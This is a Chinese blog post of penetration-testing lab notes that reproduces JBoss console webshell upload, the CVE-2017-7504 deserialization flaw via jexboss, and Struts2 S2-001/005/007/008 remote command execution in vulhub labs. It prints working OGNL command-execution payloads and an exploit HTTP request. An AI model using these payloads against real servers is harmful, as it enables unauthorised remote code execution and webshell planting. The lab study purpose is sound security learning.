{"title":"渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）","date":"2022-04-25T00:00:00.000Z","date_formatted":{"ll":"Apr 25, 2022","L":"04/25/2022","MM-DD":"04-25"},"link":"2022/04/25/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）","updated":"2023-03-17T12:07:41.499Z","content":"<h2 id=\"jboss控制台文件上传\">JBoss控制台文件上传<a title=\"#jboss控制台文件上传\" href=\"#jboss控制台文件上传\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n</ul>\n<h3 id=\"利用方式\">利用方式<a title=\"#利用方式\" href=\"#利用方式\"></a></h3>\n<p>登录控制台</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062316288.png\" alt=\"image-20220406231603135\" loading=\"lazy\" class=\"φbp\"></p>\n<p>点击deployment模块</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062115606.png\" alt=\"image-20220406211534469\" loading=\"lazy\" class=\"φbp\"></p>\n<p>addurl填写文件地址（这里用本机的apache下放置的冰蝎马并打包成zip，改后缀成war包）</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062120055.png\" alt=\"image-20220406212037012\" loading=\"lazy\" class=\"φbp\"></p>\n<p>invoke提交</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062120966.png\" alt=\"image-20220406212052888\" loading=\"lazy\" class=\"φbp\"></p>\n<p>查看是否提交成功</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062121599.png\" alt=\"image-20220406212119529\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062126893.png\" alt=\"image-20220406212646735\" loading=\"lazy\" class=\"φbp\"></p>\n<p>应用更改</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062127168.png\" alt=\"image-20220406212719075\" loading=\"lazy\" class=\"φbp\"></p>\n<p>webshell连接</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062244383.png\" alt=\"image-20220406224449298\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062245785.png\" alt=\"image-20220406224500740\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用完成。</p>\n<h2 id=\"jboss反序列化漏洞（cve-2017-7504）\">Jboss反序列化漏洞（CVE-2017-7504）<a title=\"#jboss反序列化漏洞（cve-2017-7504）\" href=\"#jboss反序列化漏洞（cve-2017-7504）\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n</ul>\n<h3 id=\"漏洞利用\">漏洞利用<a title=\"#漏洞利用\" href=\"#漏洞利用\"></a></h3>\n<p>使用jexboss获取目标shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 jexboss.py -u ip:8080</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112213503.png\" alt=\"image-20220406225043586\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062251408.png\" alt=\"image-20220406225114340\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<h2 id=\"strust2命令执行漏洞（s2-001）\">Strust2命令执行漏洞（s2-001）<a title=\"#strust2命令执行漏洞（s2-001）\" href=\"#strust2命令执行漏洞（s2-001）\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>框架特征：文件名后缀为.action/.do</li>\n<li>漏洞原理：由于用户表单提交的数据验证失败时，后端会将用户提交的参数值使用OGNL表达式进行解析，解析后将其重新填充到表单数据中，导致命令执行</li>\n</ul>\n<h3 id=\"漏洞复现\">漏洞复现<a title=\"#漏洞复现\" href=\"#漏洞复现\"></a></h3>\n<p>构造表达式尝试利用</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062010967.png\" alt=\"image-20220406201010740\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062010374.png\" alt=\"image-20220406201019293\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<p>任意命令执行payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062014538.png\" alt=\"image-20220406201424457\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<h2 id=\"strust2命令执行漏洞（s2-005）\">Strust2命令执行漏洞（s2-005）<a title=\"#strust2命令执行漏洞（s2-005）\" href=\"#strust2命令执行漏洞（s2-005）\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>漏洞原理：使用unicode编码绕过#字符</li>\n</ul>\n<h3 id=\"漏洞复现-1\">漏洞复现<a title=\"#漏洞复现-1\" href=\"#漏洞复现-1\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062016087.png\" alt=\"image-20220406201640956\" loading=\"lazy\" class=\"φbp\"></p>\n<p>抓包并发送到repeat模块</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062020504.png\" alt=\"image-20220406202053415\" loading=\"lazy\" class=\"φbp\"></p>\n<p>POC利用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1</span><br><span class=\"line\">Host: target:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062029831.png\" alt=\"image-20220406202933765\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062029937.png\" alt=\"image-20220406202921902\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<h2 id=\"strust2命令执行漏洞（s2-007）\">Strust2命令执行漏洞（s2-007）<a title=\"#strust2命令执行漏洞（s2-007）\" href=\"#strust2命令执行漏洞（s2-007）\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>漏洞原理：当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。</li>\n</ul>\n<h3 id=\"漏洞复现-2\">漏洞复现<a title=\"#漏洞复现-2\" href=\"#漏洞复现-2\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062035080.png\" alt=\"image-20220406203528005\" loading=\"lazy\" class=\"φbp\"></p>\n<p>POC利用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;pwd&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062047911.png\" alt=\"image-20220406204757823\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<h2 id=\"strust2命令执行漏洞（s2-008）\">Strust2命令执行漏洞（s2-008）<a title=\"#strust2命令执行漏洞（s2-008）\" href=\"#strust2命令执行漏洞（s2-008）\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>漏洞原理：在 devMode 模式下直接添加参数<code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令。</li>\n</ul>\n<h3 id=\"漏洞复现-3\">漏洞复现<a title=\"#漏洞复现-3\" href=\"#漏洞复现-3\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062316805.png\" alt=\"image-20220406231621624\" loading=\"lazy\" class=\"φbp\"></p>\n<p>POC利用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.47.78:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204062312383.png\" alt=\"image-20220406231251097\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用完成。</p>\n","prev":{"title":"渗透测试笔记 - day48 框架漏洞（ThinkPHP）","link":"2022/04/26/渗透测试笔记 - day48 框架漏洞（ThinkPHP）"},"next":{"title":"渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）","link":"2022/04/18/渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）"},"plink":"https://Lq0ne.github.io/2022/04/25/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）/","toc":[{"id":"jboss控制台文件上传","title":"JBoss控制台文件上传","index":"1","children":[{"id":"利用方式","title":"利用方式","index":"1.1"}]},{"id":"jboss反序列化漏洞（cve-2017-7504）","title":"Jboss反序列化漏洞（CVE-2017-7504）","index":"2","children":[{"id":"漏洞利用","title":"漏洞利用","index":"2.1"}]},{"id":"strust2命令执行漏洞（s2-001）","title":"Strust2命令执行漏洞（s2-001）","index":"3","children":[{"id":"漏洞复现","title":"漏洞复现","index":"3.1"}]},{"id":"strust2命令执行漏洞（s2-005）","title":"Strust2命令执行漏洞（s2-005）","index":"4","children":[{"id":"漏洞复现-1","title":"漏洞复现","index":"4.1"}]},{"id":"strust2命令执行漏洞（s2-007）","title":"Strust2命令执行漏洞（s2-007）","index":"5","children":[{"id":"漏洞复现-2","title":"漏洞复现","index":"5.1"}]},{"id":"strust2命令执行漏洞（s2-008）","title":"Strust2命令执行漏洞（s2-008）","index":"6","children":[{"id":"漏洞复现-3","title":"漏洞复现","index":"6.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"April 25, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/04/25/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）/\" title=\"渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）\">https://Lq0ne.github.io/2022/04/25/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）/</a>"},"reading_time":"911 words in 6 min"}